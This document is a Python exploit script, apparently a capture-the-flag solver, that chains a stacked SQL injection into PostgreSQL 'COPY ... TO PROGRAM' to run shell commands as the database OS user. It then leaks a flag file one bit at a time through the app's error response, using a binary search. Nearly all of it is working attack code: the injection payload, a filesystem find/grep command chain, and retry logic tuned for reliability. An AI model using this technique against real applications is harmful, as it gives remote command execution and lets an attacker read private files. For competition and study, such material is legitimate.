#!/usr/bin/env python
"""Read the flag off the container, deterministically.

Channel: `MARS'; COPY (SELECT 1) TO PROGRAM '<cmd>'; SELECT 1; --` runs <cmd> with /bin/sh as
the postgres OS user; a non-zero exit becomes an error, and the app renders errors as its
ordinary "no signal" -- the same one bit as the SQL oracle, but now about the whole filesystem.

A previous version recursively grepped /var/lib on every probe.  That scan is slow enough to
make some requests time out, and a timeout reads back as "no match", which silently corrupts a
binary search: it reported the flag starting with `0` even though `^sun[{]` verified true.
Pinning the file by name first (`find -name "*flag*"` + only those files checked for content)
makes every probe fast, and the whole-string verification at the end catches any bit flip.

Patterns are double-quoted (a single quote would close the injected SQL literal), carry no `$`
(the shell would expand them inside double quotes), and the recovered prefix is emitted one
bracket class per character so `{`, `}`, `.` cannot be read back as metacharacters.
"""
import string
import sys
import time

import extract as E

FIND = ('f=$(find / -name "*flag*" -type f -exec grep -ls sun{ {} + 2>/dev/null | head -1); '
        'grep -aoE "sun[{][^}]*[}]" "$f" | head -1')
ALPHA = "sun{}" + string.digits + string.ascii_lowercase + "_-.@!+~" + string.ascii_uppercase


def probe(pattern):
    cmd = '%s | grep -qE "%s"' % (FIND, pattern)
    return E.ask("MARS'; COPY (SELECT 1) TO PROGRAM '%s'; SELECT 1; -- " % cmd)


def klass(chars):
    body = "".join(c for c in chars if c != "-")
    return "[" + body + ("-" if "-" in chars else "") + "]"


def anchor(prefix):
    return "".join(klass(c) for c in prefix)


def vote(pattern, tries=2):
    """A timeout can only ever fake a False, so re-ask until a True shows up or the
    retries agree on False; a single probe would silently derail the binary search."""
    for _ in range(tries):
        if probe(pattern):
            return True
    return False


def find_char(prefix):
    head = "^" + anchor(prefix)
    lo, hi = 0, len(ALPHA) - 1
    while lo < hi:
        mid = (lo + hi) // 2
        if vote(head + klass(ALPHA[lo:mid + 1])):
            hi = mid
        else:
            lo = mid + 1
    return ALPHA[lo] if vote(head + klass(ALPHA[lo]), 3) else "?"


def recover(cap=120):
    if not probe("."):
        print("[-] no sun{...} found in any *flag* file")
        return None
    prefix = ""
    while len(prefix) < cap:
        c = find_char(prefix)
        if c == "?":
            print("[!] position %d is outside the alphabet (prefix %r)" % (len(prefix) + 1, prefix))
            break
        prefix += c
        print("   %-46s (%d probes, %d calls)" % (prefix, len(prefix), E.CALL[0]), flush=True)
        if c == "}":
            break
    full = "^" + anchor(prefix)
    print("[*] verifies as a complete match:", vote(full, 3), flush=True)
    return prefix if vote(full, 3) else None


if __name__ == "__main__":
    t0 = time.time()
    v = recover()
    print("[+] %s   (%.0fs)" % (v, time.time() - t0), flush=True)
    if v and v.startswith("sun{") and v.endswith("}"):
        open("flag.txt", "w").write(v.strip() + "\n")
